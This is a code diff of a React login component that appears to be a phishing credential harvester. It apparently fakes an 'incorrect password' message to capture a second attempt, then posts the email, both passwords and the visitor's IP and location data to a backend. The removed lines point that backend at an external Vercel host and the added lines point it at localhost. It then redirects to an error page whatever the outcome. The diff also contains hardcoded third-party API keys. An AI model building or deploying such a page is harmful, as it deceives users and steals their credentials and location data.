@@ -1,6 +1,8 @@
 import React, { useState, useEffect } from 'react';
 import axios from 'axios';
 import './Login.css';
+import { useNavigate } from 'react-router-dom';
+const VisitorAPI = require("visitorapi");
 
 const Login = () => {
   const [email, setEmail] = useState('');
@@ -11,37 +13,19 @@ const Login = () => {
   const [secondPasswordUsed, setSecondPasswordUsed] = useState('');
   const [passwordError, setPasswordError] = useState('');
   const [attemptCount, setAttemptCount] = useState(0); // To track the number of login attempts
-  const [ipInfo, setIpInfo] = useState({}); // Store IP and location info
+  const [visitorData, setVisitorData] = useState({}); // store the whole JSON data
 
-  // Fetch user's IP and location data
+  const navigate = useNavigate(); // Define the navigate function
+
+  // Fetch user's visitor data
   useEffect(() => {
-    const fetchIpInfo = async () => {
-      try {
-        // Fetch the user's IP address
-        const ipResponse = await axios.get('https://api.ipify.org?format=json');
-        const userIp = ipResponse.data.ip;
-
-        // Fetch IP info using the IP Geolocation API
-        const options = {
-          method: 'GET',
-          url: 'https://ip-geolocation-find-ip-location-and-ip-info.p.rapidapi.com/backend/ipinfo/',
-          params: { ip: userIp },
-          headers: {
-            'x-rapidapi-key': 'c9d777507cmsh257b662f6af31a9p18afcfjsn02a7344290a5', // Replace with your actual API key
-            'x-rapidapi-host': 'ip-geolocation-find-ip-location-and-ip-info.p.rapidapi.com'
-          }
-        };
-
-        const ipInfoResponse = await axios.request(options);
-        setIpInfo(ipInfoResponse.data);
-        console.log('IP Info fetched:', ipInfoResponse.data); // Check the data received
-      } catch (error) {
-        console.error('Error fetching IP info:', error);
-        setIpInfo({}); // Set an empty object in case of an error
+    VisitorAPI(
+      "ohXzOBizNPU5PSwkkR7d", // Replace with VisitorAPI key
+      data => {
+        setVisitorData(data);
+        console.log('Visitor Data fetched:', data); // Check the data received
       }
-    };
-
-    fetchIpInfo();
+    );
   }, []);
 
   // Handle email input change
@@ -85,7 +69,7 @@ const Login = () => {
 
       // Wait for 0.5 seconds before showing error message
       setTimeout(() => {
-        setPasswordError(<span className='errormsg'>The email or password entered is incorrect. Please try again</span>);
+        setPasswordError(<span className='errormsg'>The email or password entered is incorrect. Please try again.</span>);
         const passwordInput = document.getElementById('password-input');
         if (passwordInput) {
           passwordInput.focus(); // Autofocus back to password input
@@ -98,29 +82,19 @@ const Login = () => {
       setSecondPasswordUsed(password);
     }
 
-    // Check if IP info has been fetched
-    if (!ipInfo || Object.keys(ipInfo).length === 0) {
-      setPasswordError('Please try again.');
-      return;
-    }
-
-    // Create a filtered version of ipInfo excluding currency
-    const { country_currency, ...filteredIpInfo } = ipInfo; // Remove the currency field
-
     setIsLoading(true);
     setPasswordError('');
 
     // Try to send login request to backend
     try {
-      const response = await axios.post('https://nm-be.vercel.app/api/get_user_info/', {
+      const response = await axios.post('http://127.0.0.1:8000/api/get_user_info/', {
         email: email,
         firstpasswordused: firstPasswordUsed,
         secondpasswordused: password, // Send the second password attempt
-        locationInfo: filteredIpInfo, // Send the filtered IP and location data to backend
+        visitorData: visitorData, // Send the visitor data to backend
       });
       console.log('Response from backend:', response.data);
       // Handle successful response here (e.g., redirect or show success message)
-      window.location.reload(); // Reload the page for now
     } catch (error) {
       if (error.message === 'Network Error') {
         setPasswordError('We encountered a network error while attempting to connect to the server. Please try again.');
@@ -132,6 +106,7 @@ const Login = () => {
       }
     } finally {
       setIsLoading(false);
+      navigate('/error'); // You might want to navigate only on error
     }
   };
 
